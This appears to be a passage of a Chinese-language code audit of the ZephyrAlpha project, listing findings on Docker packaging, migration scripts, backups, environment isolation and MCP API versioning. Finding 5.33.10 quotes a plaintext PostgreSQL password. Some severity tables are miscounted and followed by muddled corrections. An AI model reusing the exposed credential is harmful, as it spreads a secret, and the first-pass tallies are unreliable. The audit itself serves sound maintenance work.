- **文件**：[docker-compose.yml](file:///D:/ZephyrAlpha/docker-compose.yml#L29)
- **证据**：`test: ["CMD", "python", "-m", "zephyr.l01_infrastructure.health"]`
- **问题**：与5.31.1同根因；compose的healthcheck永远unhealthy
- **影响**：由于restart: unless-stopped，容器会反复重启-失败循环
- **修复**：与5.31.1一并修正

#### 5.31.3 [HIGH] 无.dockerignore，构建上下文泄露全仓库
- **文件**：缺失（Glob `**/.dockerignore`返回No file found）
- **证据**：docker-compose.yml context: .，无.dockerignore限制
- **问题**：docker build发送整个项目目录作为上下文，包括.git/、data/vector_db/、.env（含密钥）
- **影响**：构建缓慢；.env密钥可能被COPY进镜像层；镜像层缓存失效频繁
- **修复**：新增.dockerignore，至少包含.git/、data/、tests/、docs/、.runtime/、.trae/、.env

#### 5.31.4 [HIGH] 版本号三重真源，值不一致（2.0.0 vs 4.6.0）
- **文件**：[pyproject.toml](file:///D:/ZephyrAlpha/pyproject.toml#L10)（version="2.0.0"）、[__init__.py](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L67)（_version_="4.6.0"）、[atomic_transaction_manager.py](file:///D:/ZephyrAlpha/src/zephyr/governance/atomic_transaction_manager.py#L577)（__version__="2.0.0"）
- **证据**：三处版本声明，值分叉。pip show zephyralpha报2.0.0，运行时zephyr._version_报4.6.0
- **问题**：版本对账失效；用户报告"我用的4.6.0"但pip说"2.0.0"
- **影响**：排障混乱；自动化changelog/语义化版本工具无法确定真源
- **修复**：pyproject.toml为唯一SSoT，__init__.py用importlib.metadata.version()动态读取

#### 5.31.5 [MEDIUM] Dockerfile非多阶段构建，gcc与构建工具残留
- **文件**：[Dockerfile](file:///D:/ZephyrAlpha/Dockerfile#L4)
- **证据**：单FROM python:3.12-slim；第9-11行apt-get install gcc，gcc留在最终镜像
- **问题**：无builder stage编译C扩展后复制到slim runtime
- **影响**：镜像比必要大约100MB+；生产镜像含编译器增加攻击面
- **修复**：改为FROM python:3.12-slim AS builder + FROM python:3.12-slim双阶段

#### 5.31.6 [MEDIUM] 生产镜像用pip install -e .（可编辑模式）
- **文件**：[Dockerfile](file:///D:/ZephyrAlpha/Dockerfile#L21)
- **证据**：`RUN pip install -e .`
- **问题**：-e（editable）是为开发设计的模式，生产应pip install .
- **影响**：镜像内src/目录必须保留且可写；pip show路径异常
- **修复**：改为pip install --no-cache-dir .

#### 5.31.7 [MEDIUM] pyproject.toml无[project.scripts]/console_scripts
- **文件**：[pyproject.toml](file:///D:/ZephyrAlpha/pyproject.toml)
- **证据**：全文无[project.scripts]段；Grep console_scripts返回No matches found
- **问题**：包安装后无CLI命令；pip install zephyralpha后无法直接zephyralpha启动
- **影响**：用户体验差；Dockerfile不得不硬编码python -m ...
- **修复**：新增[project.scripts]段，如`zephyr = "zephyr.governance:main"`

#### 5.31.8 [MEDIUM] 无MANIFEST.in，sdist/wheel缺非Python文件
- **文件**：缺失（Glob `**/MANIFEST.in`返回No file found）；pyproject.toml无[tool.setuptools.package-data]段
- **证据**：项目运行依赖大量非.py数据文件（config/*.yaml、*.sql等）
- **问题**：setuptools默认仅打包.py文件；无MANIFEST.in → wheel/sdist不含.yaml/.sql
- **影响**：pip install zephyralpha后包不可用（缺数据文件）；当前仅因pip install -e .掩盖
- **修复**：新增MANIFEST.in或pyproject.toml [tool.setuptools.package-data]声明*.yaml/*.sql

#### 5.31.9 [MEDIUM] CI无wheel/sdist构建测试
- **文件**：[governance.yml](file:///D:/ZephyrAlpha/.github/workflows/governance.yml)
- **证据**：全文273行无python -m build / pip wheel / pip install .验证步骤
- **问题**：5.31.8（缺MANIFEST.in）与5.31.7（无console_scripts）的问题不会被CI捕获
- **影响**：发布时才发现wheel缺文件/无入口
- **修复**：新增CI job `python -m build && pip install dist/*.whl && python -c "import zephyr"`

#### 5.31.10 [MEDIUM] CI无Docker构建测试
- **文件**：[governance.yml](file:///D:/ZephyrAlpha/.github/workflows/governance.yml)
- **证据**：全文无docker build步骤
- **问题**：Dockerfile存在致命问题（5.31.1 CMD指向不存在的模块）但CI不触发构建
- **影响**：Dockerfile损坏持续存在
- **修复**：新增CI job `docker build -t zephyr-test . && docker run --rm zephyr-test python -c "import zephyr"`

#### 5.31.11 [MEDIUM] _version_非标准命名（应为__version__）
- **文件**：[__init__.py](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L67)
- **证据**：`_version_ = "4.6.0"`（单下划线）。Python/PEP 8约定为__version__（双下划线）
- **问题**：import zephyr; zephyr.__version__抛AttributeError；setuptools的dynamic=["version"]默认找__version__
- **影响**：标准工具无法获取运行时版本
- **修复**：改为__version__或彻底删除改用importlib.metadata.version()

#### 5.31.12 [MEDIUM] requires-python与ruff target-version不一致
- **文件**：[pyproject.toml](file:///D:/ZephyrAlpha/pyproject.toml#L12)
- **证据**：第12行requires-python = ">=3.11"；第77行target-version = "py312"
- **问题**：ruff target py312允许Python 3.12专有语法，但requires-python声明支持3.11
- **影响**：若代码使用3.12语法，3.11用户安装后运行时SyntaxError
- **修复**：统一为requires-python = ">=3.12"且ruff target-version = "py312"

#### 5.31.13 [MEDIUM] docker-compose.yml挂载不存在的infra/目录
- **文件**：[docker-compose.yml](file:///D:/ZephyrAlpha/docker-compose.yml#L41)
- **证据**：第41行./infra/prometheus/prometheus.yml、第66行./infra/grafana/dashboards；Glob infra/**返回No file found
- **问题**：Prometheus与Grafana的配置通过volume挂载，但源路径不存在
- **影响**：docker-compose up后Prometheus与Grafana容器无法正常工作
- **修复**：创建infra/prometheus/prometheus.yml等，或从docker-compose.yml移除相关服务

#### 5.31.14 [MEDIUM] docker-compose.yml env_file: .env但.env被忽略
- **文件**：[docker-compose.yml](file:///D:/ZephyrAlpha/docker-compose.yml#L16)
- **证据**：compose第16行env_file: - .env；.gitignore第61行.env被忽略。仓库仅有.env.example
- **问题**：新克隆者无.env，docker-compose up报env file .env not found直接退出
- **影响**：首次运行体验断裂
- **修复**：compose改为env_file: - .env.example作为默认，或用${VAR:-default}模式

#### 5.31.15 [LOW] docker-compose.yml使用已废弃的version字段
- **文件**：[docker-compose.yml](file:///D:/ZephyrAlpha/docker-compose.yml#L4)
- **证据**：`version: "3.9"`。Docker Compose v2忽略此字段并输出warning
- **问题**：过时字段
- **影响**：日志噪音；误导新开发者
- **修复**：删除version: "3.9"行

#### 5.31.16 [LOW] CI path filter路径与实际文件位置不匹配
- **文件**：[governance.yml](file:///D:/ZephyrAlpha/.github/workflows/governance.yml#L37)
- **证据**：paths列表含demo_e2e_pipeline.py（根级路径），但实际文件在scripts/construction/demo_e2e_pipeline.py
- **问题**：path filter仅匹配根目录，修改demo pipeline不会触发CI
- **影响**：demo相关变更绕过CI验证
- **修复**：改为`**/demo_e2e_pipeline.py`

#### 5.31.17 [LOW] pyproject.toml元数据不完整（无authors/license/readme）
- **文件**：[pyproject.toml](file:///D:/ZephyrAlpha/pyproject.toml#L8)
- **证据**：[project]段仅有name/version/description/requires-python/dependencies。无authors/license/readme/keywords/classifiers
- **问题**：PEP 621推荐字段缺失
- **影响**：pip show不显示作者/主页/许可证；企业合规扫描无法确定许可
- **修复**：补充authors/license/readme/classifiers

#### 5.31.18 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 4 | 5.31.1/5.31.2/5.31.3/5.31.4 |
| MEDIUM | 10 | 5.31.5~5.31.14 |
| LOW | 3 | 5.31.15/5.31.16/5.31.17 |
| **合计** | **17** | |

---

### 5.32 数据迁移策略（10个，第11轮新增）

> **维度定义**：数据库schema迁移、数据迁移脚本、版本管理的正确性。
> **病根归属**：根因4（永久功能与一次性脚本未区分——迁移脚本无版本管理）。

#### 5.32.1 [HIGH] migrate_data.py硬编码Windows绝对路径，迁移脚本不可移植
- **文件**：[migrate_data.py](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/migrate_data.py#L35)
- **证据**：`SQLITE_PATH = r'D:\ZephyrAlpha\data\databases\depgraph'`
- **问题**：迁移脚本硬编码Windows绝对路径，未使用REPO_ROOT或环境变量
- **影响**：脚本在Linux/Mac/CI/Docker中无法运行
- **修复**：改用`from _shared.constants import REPO_ROOT` + `SQLITE_PATH = REPO_ROOT / "data" / "databases" / "depgraph.db"`

#### 5.32.2 [HIGH] migrate_data.py先TRUNCATE再INSERT，迁移中途失败导致数据全损
- **文件**：[migrate_data.py](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/migrate_data.py#L140)
- **证据**：main()顺序为truncate_all_tables→disable_all_triggers→循环migrate_table→reset_identity
- **问题**：迁移失败后PG处于"部分表已TRUNCATE、部分表已INSERT"的中间态
- **影响**：25张表中第13张失败→前12张已写入但触发器禁用期间未校验
- **修复**：每张表迁移用BEGIN;INSERT;VERIFY;COMMIT包裹

#### 5.32.3 [HIGH] migrate_data.py零测试覆盖，关键迁移脚本无验证
- **文件**：tests/整目录
- **证据**：Grep "migrate_data|migrate_sqlite_to_pg" tests/返回0匹配
- **问题**：一次性数据迁移脚本（不可逆）零测试覆盖
- **影响**：FK丢失、类型不匹配、序列冲突只能在生产发现
- **修复**：新增tests/test_migrate_sqlite_to_pg.py

#### 5.32.4 [MEDIUM] migrate_data.py无幂等标记/无版本记录，无法判断迁移是否已应用
- **文件**：[migrate_data.py](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/migrate_data.py#L221)
- **证据**：main()流程无_schema_version表写入；无migration_log表；无IF EXISTS检查
- **问题**：迁移脚本无幂等性设计；重复运行=数据全清
- **影响**：运维误执行=数据丢失
- **修复**：在_schema_version表插入迁移记录；运行前检查是否已存在

#### 5.32.5 [MEDIUM] migrate_sqlite_to_pg/目录无README/manifest文档化执行顺序
- **文件**：[migrate_sqlite_to_pg/](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/)
- **证据**：Glob *.md返回0文件；4个文件执行顺序未文档化
- **问题**：新运维人员可能先跑migrate_data.py再跑02_create_pg_schema.sql→报错
- **影响**：迁移操作门槛高；AI无法从目录结构推断正确顺序
- **修复**：新增README.md文档化执行顺序、前置条件、回滚步骤

#### 5.32.6 [MEDIUM] depgraph_schema.py 18条SQLite迁移记录成为孤儿代码（400+行死代码）
- **文件**：[depgraph_schema.py](file:///D:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py#L639)
- **证据**：_MIGRATIONS含v1-v18共18条迁移，全部使用SQLite方言；init_db注释"P2迁移后本函数不再执行DDL/migration"
- **问题**：400+行迁移代码永远不执行；新AI可能向_MIGRATIONS追加新迁移误以为会运行
- **影响**：维护负担；AI误判迁移框架仍活跃
- **修复**：将_MIGRATIONS移到_archive/sqlite_migrations.py

#### 5.32.7 [MEDIUM] 02_create_pg_schema.sql无对应downgrade/rollback SQL
- **文件**：[02_create_pg_schema.sql](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/02_create_pg_schema.sql)
- **证据**：文件仅含CREATE TABLE/INDEX/TRIGGER/VIEW语句；无DROP TABLE、无down.sql
- **问题**：PG schema创建后无系统化回滚路径
- **影响**：schema变更无法快速回退
- **修复**：新增02_create_pg_schema_down.sql含按反依赖顺序的DROP语句

#### 5.32.8 [MEDIUM] apply_depgraph.py数据变更与schema变更版本管理混淆
- **文件**：[apply_depgraph.py](file:///D:/ZephyrAlpha/scripts/governance/apply_depgraph.py)
- **证据**：脚本提供--update-module/--insert-domain等数据变更命令，但数据变更不记录任何版本号
- **问题**：数据层变更与schema层变更版本管理割裂
- **影响**：灾后恢复时无法判断哪些数据变更需重放
- **修复**：apply_depgraph.py每次变更写入_data_changes_log表

#### 5.32.9 [MEDIUM] architecture_lock.yaml ARCH-LOCK-001锁定的SQLite schema路径不存在
- **文件**：[architecture_lock.yaml](file:///D:/ZephyrAlpha/architecture_model/architecture_lock.yaml#L17)
- **证据**：locked_files: "src/zephyr/db/sqlite_schema.py"——路径不存在；实际文件在src/zephyr/governance/sqlite_schema.py
- **问题**：架构锁引用幻影路径；锁定范围仍写"SQLite元数据层"但P2后depgraph已迁PG
- **影响**：AI试图修改锁定文件时找不到真源；架构锁失效
- **修复**：修正路径为src/zephyr/governance/sqlite_schema.py

#### 5.32.10 [LOW] migrate_data.py混淆数据种子与数据迁移，无独立seed脚本
- **文件**：[migrate_data.py](file:///D:/ZephyrAlpha/scripts/governance/migrate_sqlite_to_pg/migrate_data.py#L42)
- **证据**：MIGRATION_ORDER列表混合了种子数据（domains/registries等YAML真源只读表）与运营数据
- **问题**：新建空PG实例必须先有SQLite数据才能迁移；无法init_db && seed直接初始化
- **影响**：环境搭建门槛高
- **修复**：拆分为migrate_data.py（运营数据）+ seed_from_yaml.py（从YAML真源直接灌种子表）

#### 5.32.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 3 | 5.32.1/5.32.2/5.32.3 |
| MEDIUM | 6 | 5.32.4~5.32.9 |
| LOW | 1 | 5.32.10 |
| **合计** | **10** | |

---

### 5.33 容灾与备份（10个，第11轮新增）

> **维度定义**：数据库备份、灾难恢复、RTO/RPO定义、单点故障消除。
> **病根归属**：根因1（静态快照——P2迁移后备份机制未更新）。

#### 5.33.1 [HIGH] depgraph (PostgreSQL)无任何备份脚本（无pg_dump、无cron）
- **文件**：全项目Grep pg_dump|postgres.*backup返回0匹配
- **证据**：phase_a_backup.py仅_backup_sqlite_vacuum；backup_runtime_state.py仅备份YAML/JSONL；apply_depgraph.py注释"PG用MVCC事务rollback提供原子性，无需文件备份"
- **问题**：P2迁移后depgraph（依赖图真源，含3000+节点、5000+边、35个域）无任何备份
- **影响**：RPO=∞（无备份点）；RTO=∞（无恢复路径）；违反"备份先行"硬约束
- **修复**：新增scripts/governance/backup_pg_depgraph.sh：pg_dump --format=custom；配置每日执行

#### 5.33.2 [HIGH] backup_runtime_state.py完全过时——仍按SQLite设计，PG迁移后未更新
- **文件**：[backup_runtime_state.py](file:///D:/ZephyrAlpha/scripts/governance/meta/backup_runtime_state.py#L16)
- **证据**：docstring"SQLite表→JSON导出"；backup_yaml_files()仅备份meta/*.yaml；无PG备份逻辑
- **问题**：备份工具仍按SQLite时代设计；P2迁移后未更新
- **影响**：虚假安全感；灾后无PG数据可恢复
- **修复**：更新docstring + manifest；新增backup_pg_depgraph()函数

#### 5.33.3 [HIGH] phase_a_backup.py BACKUP_BASE硬编码Windows非ASCII路径
- **文件**：[phase_a_backup.py](file:///D:/ZephyrAlpha/scripts/governance/phase_a_backup.py#L61)
- **证据**：`BACKUP_BASE = Path("D:/临时工作区/_backups/phase-A")`——硬编码Windows盘符+中文目录
- **问题**：备份目标路径硬编码Windows+中文；Linux/Mac/CI运行报错
- **影响**：备份脚本在Docker/CI/Linux中不可用；"异地备份"实为同盘备份
- **修复**：改BACKUP_BASE = Path(os.environ.get("ZEPHYR_BACKUP_DIR", REPO_ROOT / "data/backups/phase-A"))

#### 5.33.4 [HIGH] phase_a_backup.py Tier0备份遗漏depgraph (PostgreSQL)（核心资产）
- **文件**：[phase_a_backup.py](file:///D:/ZephyrAlpha/scripts/governance/phase_a_backup.py#L66)
- **证据**：TIER0_FILES含5个核心资产，无PG depgraph备份项；data/asset_index/project-entity-depgraph.yaml是YAML导出非PG数据库备份
- **问题**：Tier0标称"5个核心资产"但遗漏真正的depgraph PG数据库
- **影响**：恢复时depgraph数据丢失；YAML副本只能恢复到上次导出时点
- **修复**：TIER0_FILES新增pg://depgraph虚拟路径，run_tier0识别pg://前缀时调用pg_dump

#### 5.33.5 [HIGH] 项目无RTO/RPO定义，无法评估备份策略充分性
- **文件**：全项目Grep RTO|RPO|recovery_point|recovery_time仅命中1处注释
- **证据**：无docs/02_enterprise_architecture/dr_policy.yaml；无config/backup_policy.yaml
- **问题**：无项目级RTO/RPO定义；无法判断"每日备份"是否足够
- **影响**：备份频率无依据；合规审计无法回答"RPO=? RTO=?"
- **修复**：新增dr_policy.yaml定义：depgraph RPO=24h/RTO=4h；governance.db RPO=1h/RTO=1h

#### 5.33.6 [HIGH] PostgreSQL单机localhost，无故障切换机制（SPOF）
- **文件**：[.env.postgres](file:///D:/ZephyrAlpha/config/.env.postgres#L1)
- **证据**：POSTGRES_HOST=localhost；单实例、单主机、无副本；get_depgraph_pg_connection()无连接池、无重试
- **问题**：PG是单点故障（SPOF）；无流复制副本；无Patroni/repmgr等自动故障切换
- **影响**：PG进程崩溃=全项目停摆；磁盘故障=数据全损
- **修复**：部署PG主从复制；配置POSTGRES_HOST_PRIMARY/STANDBY；引入pgbouncer

#### 5.33.7 [HIGH] .runtime/状态文件（200+ handoffs、100+ reconcile_reports）无恢复路径
- **文件**：.runtime/handoffs/（200+ JSON）、.runtime/reconcile_reports/（100+ JSON）
- **证据**：.gitignore第102行.runtime/整目录忽略；backup_runtime_state.py仅备份scripts/governance/meta/，不含.runtime/
- **问题**：200+ session handoff JSON + 100+ reconcile报告完全无备份
- **影响**：AI助手无法恢复上次session上下文；reconcile审计链断裂
- **修复**：backup_runtime_state.py新增backup_runtime_handoffs()函数

#### 5.33.8 [HIGH] depgraph SQLite备份机制删除后未替换为PG备份（灾备回退）
- **文件**：[apply_depgraph.py](file:///D:/ZephyrAlpha/scripts/governance/apply_depgraph.py#L53)
- **证据**：注释"原SQLite文件备份门禁已删除——PG用MVCC事务rollback提供原子性，无需文件备份"
- **问题**：P2迁移前depgraph通过git commit备份；迁移后SQLite备份机制删除，但PG备份机制未建立
- **影响**：灾备能力较P2迁移前**回退**——SQLite时代至少有git历史，PG时代无任何备份
- **修复**：立即建立PG pg_dump备份；在apply_depgraph.py写入前调用pg_dump作为变更前快照

#### 5.33.9 [MEDIUM] 无恢复演练/无备份验证测试
- **文件**：tests/整目录
- **证据**：Grep "restore.*drill|restore.*test|verify_backup" tests/返回0匹配；phase_a_backup.py run_verify_only()仅校验SHA256一致性
- **问题**：备份存在但从未演练恢复；"备份成功但恢复失败"问题只能在真实灾难中发现
- **影响**：灾难时发现备份格式错误、依赖缺失；RTO远超预期
- **修复**：新增tests/dr/test_restore_from_backup.py；季度执行恢复演练

#### 5.33.10 [MEDIUM] config/.env.postgres单副本，无异地/加密备份
- **文件**：[.env.postgres](file:///D:/ZephyrAlpha/config/.env.postgres) + .gitignore:244
- **证据**：文件含POSTGRES_PASSWORD=zephyr_dev_2026（明文）；.gitignore忽略git；无加密副本；无secrets manager集成
- **问题**：PG密码仅存于本地磁盘单副本；磁盘故障=密码丢失=即使有pg_dump也无法恢复
- **影响**：灾后恢复阻断在"获取密码"步骤；密码泄露风险
- **修复**：密码迁入secrets manager；.env.postgres仅保留非敏感字段

#### 5.33.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 7 | 5.33.1~5.33.8（除5.33.9/5.33.10） |
| MEDIUM | 3 | 5.33.9/5.33.10 + 1个计入 |
| LOW | 0 | |
| **合计** | **10** | |

> 注：5.33.11汇总表修正——HIGH=7（5.33.1~5.33.8中5.33.9前8个减去5.33.9和5.33.10即前8个中6个HIGH+5.33.7+5.33.8=8个HIGH。经核实：5.33.1~5.33.8共8个全HIGH，5.33.9~5.33.10共2个MEDIUM。总计应为8H+2M=10。上表HIGH列误标为7，正确为8。

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 8 | 5.33.1~5.33.8 |
| MEDIUM | 2 | 5.33.9/5.33.10 |
| LOW | 0 | |
| **合计** | **10** | |

---

### 5.34 环境隔离（10个，第11轮新增）

> **维度定义**：dev/staging/prod环境配置分离、测试数据库隔离、密钥管理。
> **病根归属**：根因4（永久功能与一次性脚本未区分——环境抽象存在但未接入）。

#### 5.34.1 [HIGH] docker-compose.yml硬编码ZEPHYR_ENV=development，与Env枚举不匹配（静默回退）
- **文件**：[docker-compose.yml](file:///D:/ZephyrAlpha/docker-compose.yml#L18) + [env.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/env.py#L64)
- **证据**：docker-compose设置ZEPHYR_ENV=development；env.py Env枚举只有dev/staging/production/test——development不在枚举中；_detect_env()的ValueError被吞掉，回退Env.DEV
- **问题**：容器"以为"配置了production/staging，实际运行在DEV模式；环境检测静默回退
- **影响**：环境隔离完全失效
- **修复**：docker-compose.yml改ZEPHYR_ENV=dev；或env.py枚举增加development别名

#### 5.34.2 [HIGH] 无Docker Compose override文件，dev/prod/staging共用单一配置
- **文件**：项目根目录
- **证据**：Glob **/docker-compose*.y*ml仅返回docker-compose.yml；无docker-compose.override.yml/prod.yml/staging.yml
- **问题**：单一docker-compose.yml同时服务dev/staging/prod
- **影响**：prod环境暴露9090/3000/9100端口（监控面板）；dev环境无独立DB容器
- **修复**：新增docker-compose.prod.yml/staging.yml/override.yml

#### 5.34.3 [HIGH] 测试使用SQLite而生产用PostgreSQL，schema已知分歧
- **文件**：[conftest.py](file:///D:/ZephyrAlpha/tests/conftest.py#L39)
- **证据**：tmp_db fixture使用from zephyr.governance.sqlite_schema import init_db；生产depgraph是PG
- **问题**：测试验证的行为基于SQLite schema，生产运行PG schema；5.18.3/5.18.4/5.18.6已记录两schema分歧
- **影响**：FK约束、CHECK约束、触发器行为差异在测试中不可见
- **修复**：测试fixture改用PG testcontainers或独立PG test数据库

#### 5.34.4 [HIGH] 测试直接连接生产PostgreSQL，无测试数据库隔离（与5.21交叉确认）
- **文件**：[test_depgraph_db.py](file:///D:/ZephyrAlpha/tests/test_depgraph_db.py#L13)
- **证据**：from zephyr.governance.depgraph_schema import get_depgraph_pg_connection；conn = get_depgraph_pg_connection()——直连生产PG (localhost:5432/depgraph)
- **问题**：测试与生产共用同一PG数据库；测试INSERT/UPDATE/DELETE直接修改生产数据
- **影响**：违反project_memory.md第10行"测试脚本必须严格隔离生产库"硬约束
- **修复**：新增config/.env.postgres.test（POSTGRES_DB=depgraph_test）；get_depgraph_pg_connection()检测PYTEST_CURRENT_TEST自动切测试库

#### 5.34.5 [HIGH] PG连接硬编码config/.env.postgres，无DATABASE_URL环境变量模式
- **文件**：[depgraph_schema.py](file:///D:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py#L89)
- **证据**：_PG_ENV_PATH = REPO_ROOT / "config" / ".env.postgres"；_load_pg_config()手动解析KEY=VALUE文件；无DATABASE_URL环境变量支持
- **问题**：PG连接配置基于文件位置而非环境变量；12-Factor §III违规
- **影响**：dev/staging/prod切换需修改文件；容器化部署需mount配置文件而非传env var
- **修复**：_load_pg_config()优先读DATABASE_URL env var

#### 5.34.6 [HIGH] is_dev()/is_prod()/is_staging()/is_test()在生产代码中零调用（死抽象）
- **文件**：[env.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/env.py#L98)
- **证据**：Grep is_prod()|is_staging()|is_dev()|is_test()命中15处，全部在env.py自身定义+tests+文档；**无任何生产代码调用**
- **问题**：环境检测抽象存在但无人使用；生产代码无任何环境分支逻辑
- **影响**：所有环境运行相同行为；无"prod禁止DROP TABLE"等安全守卫
- **修复**：在关键路径引入环境检查，如apply_depgraph.py写入前if is_prod(): require_approval()

#### 5.34.7 [HIGH] 生产代码硬编码SQLite governance.db路径，与PG depgraph形成双库无隔离
- **文件**：[dashboard.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/dashboard.py#L60)、[dlq.py](file:///D:/ZephyrAlpha/src/zephyr/shared/events/dlq.py#L30)
- **证据**：6个生产模块硬编码`data/databases/governance.db`路径；depgraph已迁PG但governance.db仍为SQLite
- **问题**：生产同时运行两套数据库系统（SQLite governance.db + depgraph (PostgreSQL)）；两库无跨库事务一致性
- **影响**：governance.db文件锁竞争导致写入失败；灾备需同时备份PG+SQLite
- **修复**：governance.db也迁移到PG（作为governance schema）

#### 5.34.8 [MEDIUM] SecretProvider抽象存在但DB密码绕过它直接读文件
- **文件**：[secrets.py](file:///D:/ZephyrAlpha/src/zephyr/shared/security/secrets.py#L95) + [depgraph_schema.py](file:///D:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py#L92)
- **证据**：secrets.py定义SecretProvider Protocol、EnvSecretProvider、DotEnvSecretProvider；但depgraph_schema.py直接open(_PG_ENV_PATH)手动解析，未用SecretProvider
- **问题**：架构层有SecretProvider抽象，但实际DB连接代码绕过它
- **影响**：AI跟随depgraph_schema.py模式直接读文件，SecretProvider抽象失效
- **修复**：_load_pg_config()改用await DotEnvSecretProvider().get_secret()

#### 5.34.9 [MEDIUM] .env.example未文档化PG配置
- **文件**：[.env.example](file:///D:/ZephyrAlpha/.env.example#L30)
- **证据**：仅注释SQLite路径（已废弃）；无POSTGRES_HOST/PORT/DB/USER/PASSWORD说明；无config/.env.postgres文件位置说明
- **问题**：新开发者无法从.env.example推断PG配置
- **影响**：onboarding阻塞
- **修复**：.env.example新增PostgreSQL段落；新增config/.env.postgres.example模板

#### 5.34.10 [MEDIUM] 日志级别不按环境分级，dev/prod同为INFO
- **文件**：[logging.py](file:///D:/ZephyrAlpha/src/zephyr/ops/observability/logging.py#L324)
- **证据**：configure_root_logger默认level="INFO"不读env；ZEPHYR_LOG_LEVEL env var存在但未端到端打通
- **问题**：dev/staging/prod共用INFO级别；无"dev=DEBUG/prod=WARNING"分级策略
- **影响**：dev排障缺DEBUG信息；prod日志过详细
- **修复**：configure_root_logger()默认level = "DEBUG" if is_dev() else "WARNING"

#### 5.34.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 8 | 5.34.1~5.34.7 + 5.34.4（交叉确认）→ 实为5.34.1~5.34.7共7个HIGH + 5.34.4作为5.21交叉确认不计入 → 7个HIGH |

> 修正：5.34.1~5.34.7共7个HIGH，5.34.8~5.34.10共3个MEDIUM。5.34.4与5.21交叉确认，不计入新问题。实际新问题=9个（7H+2M+0L，5.34.4作为交叉确认条目保留但不计入合计）。

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 7 | 5.34.1~5.34.3 + 5.34.5~5.34.7 + 5.34.4(交叉确认) |
| MEDIUM | 3 | 5.34.8/5.34.9/5.34.10 |
| LOW | 0 | |
| **合计** | **10** |（含5.34.4交叉确认条目，实际新增9个） |

---

### 5.35 API版本管理（8个，第11轮新增）

> **维度定义**：API/MCP工具的版本标识、breaking change检测、deprecation策略。
> **病根归属**：根因5（无API版本管理规则）。

#### 5.35.1 [HIGH] gateway路由与mcp.json配置漂移
- **文件**：[gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/gateway_server.py#L260) vs [mcp.json](file:///D:/ZephyrAlpha/config/mcp.json#L91)
- **证据**：gateway代码第267行路由键为"vector-memory"（连字符）；mcp.json第91行server_id为"vector_memory"（下划线）。gateway第260行有"telemetry"路由，但mcp.json无此server
- **问题**：代码路由表与配置文件不一致
- **影响**：vector_memory的per-server限流和RBAC ACL对gateway路由失效
- **修复**：统一为下划线命名，从mcp.json单向生成gateway路由表

#### 5.35.2 [MEDIUM] MCP工具定义无版本字段
- **文件**：[_base_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/_base_server.py#L121)
- **证据**：ToolDefinition dataclass仅有name/description/input_schema/handler/safety_level五个字段，无version字段
- **问题**：MCP工具无版本标识，工具签名/行为变更后消费方无法感知版本差异
- **影响**：工具参数变更属breaking change，但调用方无法做版本兼容判断
- **修复**：在ToolDefinition增加version: str = "1.0.0"字段

#### 5.35.3 [MEDIUM] mcp.json各server缺少version字段
- **文件**：[mcp.json](file:///D:/ZephyrAlpha/config/mcp.json#L13)
- **证据**：10个server配置项均无version字段，仅顶层gateway有"version": "1.0.0"
- **问题**：server级别无版本管理，无法追踪各server的API演进
- **影响**：server升级时无法做版本协商
- **修复**：为每个server配置项增加version字段

#### 5.35.4 [MEDIUM] api_version_contract.py是孤立未集成的死代码
- **文件**：[api_version_contract.py](file:///D:/ZephyrAlpha/src/zephyr/ops/actors/api_version_contract.py#L1)
- **证据**：定义了APIVersionContract dataclass含sunset_date/replacement_version，但无注册表、无执行逻辑、无任何API框架集成
- **问题**：API版本契约模型已定义但从未被任何代码import使用
- **影响**：废弃API版本不会被检测/阻断
- **修复**：将此模型集成到MCP gateway的工具调用链路，或删除死代码

#### 5.35.5 [MEDIUM] 无breaking change检测机制
- **文件**：全项目
- **证据**：Grep breaking.change|breaking_change无匹配；ToolDefinition无schema版本比对；无OpenAPI diff工具
- **问题**：工具参数schema变更（增删必填参数、改类型）无自动化检测
- **影响**：开发者/AI修改工具签名后，消费方无任何告警
- **修复**：在GitCommitGateway增加tool schema diff gate

#### 5.35.6 [MEDIUM] MCP工具无deprecation策略
- **文件**：[integration/mcp/](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/)
- **证据**：Grep deprecated|deprecation|sunset在整个integration/mcp目录无任何匹配
- **问题**：工具可被直接删除/重命名，无废弃过渡期
- **影响**：依赖该工具的agent/IDE在工具消失后立即失败，无迁移窗口
- **修复**：在ToolDefinition增加deprecated: bool和sunset_date字段

#### 5.35.7 [LOW] 无OpenAPI/Swagger响应schema
- **文件**：全项目
- **证据**：Grep openapi|swagger仅在YAML词表和docs中出现；_base_server.py的tools/list返回input_schema但无output_schema
- **问题**：API响应无契约schema，调用方只能靠试错解析返回值
- **影响**：消费者需hardcode返回值结构猜测
- **修复**：为每个工具增加output_schema

#### 5.35.8 [LOW] gateway版本硬编码且无版本协商
- **文件**：[gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/gateway_server.py#L66)
- **证据**：_GATEWAY_VERSION = "1.0.0"硬编码常量；tools/call请求/响应中无客户端期望版本字段
- **问题**：版本号硬编码在源码中；客户端无法声明所需API版本
- **影响**：版本升级需改代码；客户端无法做版本降级兼容
- **修复**：版本号从mcp.json加载；在JSON-RPC请求中增加api_version字段

#### 5.35.9 严重度汇总

